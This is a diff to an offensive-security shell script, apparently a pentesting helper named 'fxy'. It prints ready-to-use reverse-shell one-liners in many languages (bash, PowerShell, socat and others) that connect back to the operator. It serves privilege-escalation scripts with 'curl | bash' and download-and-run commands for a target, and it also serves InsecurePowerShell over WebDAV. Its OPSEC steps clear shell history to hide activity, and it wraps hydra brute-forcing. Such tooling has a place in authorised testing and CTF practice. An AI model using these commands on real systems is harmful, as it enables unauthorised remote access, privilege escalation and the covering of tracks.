@@ -7,7 +7,7 @@ IFS=$'\n\t'
 #set -x
 
 prompt() {
-  read -p "Run command? (y/N): " -n 1 -r
+  read -p "[?] Run command? (y/N): " -n 1 -r
   echo
   if [[ ! "$REPLY" =~ ^[Yy]$ ]]; then
     exit
@@ -206,7 +206,7 @@ if [ "$1" == "l" ] || [ "$1" == "listen" ] ; then
   fi
   CMD="$CMD -vlkp $PORT"
   # https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
-  echo "> Shell upgrade instructions:"
+  echo "[*] Shell upgrade instructions:"
   echo "    python -c 'import pty;pty.spawn(\"/bin/bash\")'"
   echo "    python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
   echo "    Ctrl-z"
@@ -217,7 +217,7 @@ if [ "$1" == "l" ] || [ "$1" == "listen" ] ; then
   COLS="$(stty -a | grep -oE "columns [0-9]{1,}" | cut -d' ' -f2)"
   echo -e " stty rows $ROWS columns $COLS\n"
   # https://attack.mitre.org/techniques/T1070/003/
-  echo "> OPSEC:"
+  echo "[*] OPSEC instructions:"
   echo "    unset HISTFILE; export HISTFILESIZE=0;"
   echo "    # make sure to check history before deleting!"
   echo -e "    history -c; rm ~/.bash_history\n"
@@ -423,8 +423,7 @@ if [ "$1" == "peas" ] && [ "$#" -eq 1 ]; then
 fi
 
 if [ "$1" == "peas" ] && [ "$#" -ge 2 ] && { [ "$2" == "lin" ] || [ "$2" == "winany" ] || [ "$2" == "winbat" ] || [ "$2" == "win86" ] || [ "$2" == "win64" ]; }; then
-  echo "Download *peas and serve via http.server?"
-  prompt
+  echo "[?] Download *peas and serve via http.server?"; prompt
 
   FPATH="/dev/shm/.fxy/peas"
   if [ ! -d "$FPATH" ]; then
@@ -433,7 +432,7 @@ if [ "$1" == "peas" ] && [ "$#" -ge 2 ] && { [ "$2" == "lin" ] || [ "$2" == "win
   cd "$FPATH"
 
   case "$2" in
-    "lin" )      wget 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh' -O "$FPATH/linpeas.sh" ;;
+    "lin")       wget 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh' -O "$FPATH/linpeas.sh" ;;
     "winbat")    wget 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat' -O "$FPATH/winPEAS.bat" ;;
     "winany")    wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe' -O "$FPATH/winPEASany.exe" ;;
     "win86")     wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx86.exe' -O "$FPATH/winPEASx86.exe" ;;
@@ -447,21 +446,20 @@ if [ "$1" == "peas" ] && [ "$#" -ge 2 ] && { [ "$2" == "lin" ] || [ "$2" == "win
   fi
 
   CMD="python3 -m http.server $PORT"
-  echo "$(tput bold)Run this on your target:"
+  echo "$(tput bold)[*] Run this on your target:"
 
   case "$2" in
-    "lin" )      echo "  curl -s $(getIP)/linpeas.sh|bash|tee linpeas_"'$(whoami).log' ;;
-    "winbat")    echo "  Invoke-WebRequest -OutFile winPEAS.bat -Uri http://$(getIP)/winPEAS.bat" ;;
-    "winany")    echo "  Invoke-WebRequest -OutFile winPEASany.exe -Uri http://$(getIP)/winPEASany.exe" ;;
-    "win86")     echo "  Invoke-WebRequest -OutFile winPEASx86.exe -Uri http://$(getIP)/winPEASx86.exe" ;;
-    "win64")     echo "  Invoke-WebRequest -OutFile winPEASx64.exe -Uri http://$(getIP)/winPEASx64.exe"  ;;
+    "lin")       echo "  curl -s $(getIP)/linpeas.sh|bash|tee linpeas_"'$(whoami).log' ;;
+    "winbat")    echo "  Invoke-WebRequest -OutFile winPEAS.bat -Uri http://$(getIP)/winPEAS.bat; .\winPEAS.bat|tee winpeas.log" ;;
+    "winany")    echo "  Invoke-WebRequest -OutFile winPEASany.exe -Uri http://$(getIP)/winPEASany.exe;.\winPEASany.exe| tee winpeas.log" ;;
+    "win86")     echo "  Invoke-WebRequest -OutFile winPEASx86.exe -Uri http://$(getIP)/winPEASx86.exe;.\winPEASx86.exe| tee winpeas.log" ;;
+    "win64")     echo "  Invoke-WebRequest -OutFile winPEASx64.exe -Uri http://$(getIP)/winPEASx64.exe;.\winPEASx64.exe| tee winpeas.log"  ;;
     *)           echo "[!] Error parsing PEAS version for help text!"; exit ;;
   esac
 
   echo "$(tput sgr0) "
   echo "> $CMD"
   bash -c "$CMD"
-  rm -rf "$FPATH"
   exit
 fi
 
@@ -772,7 +770,7 @@ if { [ "$1" == "hydra" ] || [ "$1" == "brute" ]; } && [ "$#" -ge 2 ]; then
 
   SVC="$2"
   case "$SVC" in
-    "ssh" )             PORT="-s 22"; SVC="ssh" ;;
+    "ssh")              PORT="-s 22"; SVC="ssh" ;;
     "ftp")              PORT="-s 21"; SVC="ftp" ;;
     "smb")              PORT="-s 445"; SVC="smb" ;;
     "http"|"http-get")  PORT="-s 80"; SVC="http-get"; SUBDIR="/" ;;
@@ -800,13 +798,13 @@ if { [ "$1" == "hydra" ] || [ "$1" == "brute" ]; } && [ "$#" -ge 2 ]; then
   exit
 fi
 
-## rev(shell) [type] [port]\t\t\t: Reverse shells (bash, php, python, perl, ...)
+## rev(shell) [type] [port]\t\t\t: Reverse shell generator (bash, php, python, perl, ...)
 # revshell help
 if { [ "$1" == "revshell" ] || [ "$1" == "rev" ]; } && [ "$#" -eq 1 ]; then
   echo "Available commands:"
   echo "  fxy revshell [type] [port]"
   echo -e "\nAvailable revshells:"
-  SHELLS="bash php pyton2|py2 python|python3|py|py3 perl ruby nc|ncat|netcat awk go psh lua telnet"
+  SHELLS="bash php pyton2|py2 python|python3|py|py3 perl ruby nc|ncat|netcat awk go ps|psh|pwsh|powershell lua telnet socat"
   IFS=" "
   for i in $SHELLS; do
     echo "[+] $i"
@@ -825,18 +823,19 @@ if { [ "$1" == "revshell" ] || [ "$1" == "rev" ]; } && [ "$#" -ge 2 ]; then
   echo -e "> Run this on your target:\n"
   TYPE="$2"
   case "$TYPE" in
-    "bash" )                        echo "bash -i >& /dev/tcp/$(getIP)/$PORT 0>&1" ;;
+    "bash")                         echo "bash -i >& /dev/tcp/$(getIP)/$PORT 0>&1" ;;
     "php")                          echo "php -r '\$s=fsockopen(\"$(getIP)\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" ;;
     "python2"|"py2")                echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$(getIP)\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" ;;
     "python"|"python3"|"py"|"py3")  echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$(getIP)\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" ;;
-    "perl" )                        echo "perl -e 'use Socket;\$i="\"$(getIP)\"";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" ;;
-    "ruby" )                        echo "ruby -rsocket -e'f=TCPSocket.open(\"$(getIP)\",$PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" ;;
+    "perl")                         echo "perl -e 'use Socket;\$i="\"$(getIP)\"";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" ;;
+    "ruby")                         echo "ruby -rsocket -e'f=TCPSocket.open(\"$(getIP)\",$PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" ;;
     "nc"|"ncat"|"netcat")           echo "nc -e /bin/sh $(getIP) $PORT" ;;
     "awk")                          echo -e "[*] WARNING: This shell is NOT upgradeable!\n"; echo "awk 'BEGIN {s=\"/inet/tcp/0/$(getIP)/$PORT\";while(42){do{printf \"shell> \"|& s;s|& getline c; if(c){while((c|& getline)>0) print \$0|& s;close(c);}} while(c!=\"exit\") close(s);}}' /dev/null" ;;
     "go"|"golang")                  echo "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$(getIP):$PORT\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go" ;;
     "ps"|"psh"|"powershell"|"pwsh") echo "powershell -NoP -NonI -W Hidden -Exec Bypass -c \"\$a=New-Object System.Net.Sockets.TCPClient('$(getIP)',$PORT);\$b=\$a.GetStream();[byte[]]\$d=0..65535|%{0};while((\$e=\$b.Read(\$d,0,\$d.Length)) -ne 0){;\$i=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$d,0,\$e);\$k=(iex \$i 2>&1|Out-String);\$m=\$k+'PS '+(pwd).Path+'> ';\$o=([text.encoding]::ASCII).GetBytes(\$m);\$b.Write(\$o,0,\$o.Length);\$b.Flush()};\$a.Close()\"" ;;
     "lua")                          echo -e "# Linux (tested with lua5.3):\nlua -e \"require('os');s=require('socket');s.tcp();s.connect('$(getIP)','$PORT');os.execute('/bin/sh -i <&3 >&3 2>&3')" ;;
-    "telnet" )                      echo "rm -f /tmp/p; mknod /tmp/p p && telnet $(getIP) $PORT 0/tmp/p" ;;
+    "telnet")                       echo "rm -f /tmp/p; mknod /tmp/p p && telnet $(getIP) $PORT 0/tmp/p" ;;
+    "socat")                        echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$(getIP):$PORT" ;;
     *)                              echo "[!] Unknown revshell type!" ;;
   esac
   echo
@@ -926,7 +925,7 @@ if { [ "$1" == "hashgen" ] || [ "$1" == "hg" ]; } && [ "$#" -eq 3 ]; then
   exit
 fi
 
-## h(ash)i(d) [hash]\t: Identify hash type
+## h(ash)i(d) [hash]\t\t\t\t: Identify hash type
 if { [ "$1" == "hashid" ] || [ "$1" == "hid" ] || [ "$1" == "hi" ]; } && [ "$#" -eq 2 ]; then
   HASH="$2"
   if [ "$(which hashid)" ]; then
@@ -938,6 +937,43 @@ if { [ "$1" == "hashid" ] || [ "$1" == "hid" ] || [ "$1" == "hi" ]; } && [ "$#" 
     echo -n "$HASH" | hash-identifier 2>/dev/null| sed '1,14d' | head -n -2
   fi
   exit
+fi
+
+## ipwsh [port]\t\t\t\t: Download InsecurePowerShell and serve via davserver
+if [ "$1" == "ipwsh" ]; then
+  echo "[?] Download InsecurePowerShell and serve via davserver?"; prompt
+  if [ ! "$(which davserver)" ]; then
+    echo "[!] 'davserver' required but missing."
+    CMD="sudo pip3 install PyWebDAV3"
+    echo "> $CMD";
+    prompt
+    bash -c "$CMD"
+  fi
+
+  FPATH="/dev/shm/.fxy/ipwsh"
+  if [ -d "$FPATH/pwsh" ]; then
+    cd "$FPATH/pwsh"
+  else
+    mkdir -p "$FPATH"
+    cd "$FPATH"
+    wget https://github.com/cobbr/InsecurePowerShell/releases/download/InsecurePowerShell-v6.0.0-rc.2/InsecurePowerShell-v6.0.0-rc.2-win-x64.zip -O pwsh.zip
+    unzip pwsh.zip
+    mv InsecurePowerShell-v6.0.0-rc.2-win-x64 pwsh
+    cd pwsh
+  fi
+
+  PORT="80"
+  if [ "$#" -ge 2 ]; then
+    PORT="$2"
+  fi
+
+  echo -e "\n$(tput bold)[*] Run this on your target:"
+  echo "\\\\$(getIP)\pwsh.exe"
+  echo "$(tput sgr0) "
+
+  CMD="davserver -H 0.0.0.0 -P $PORT -D $FPATH/pwsh -n"
+  echo "> $CMD";
+  bash -c "$CMD"
 fi
 
 # gobuster dir -u http://10.10.10.191/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
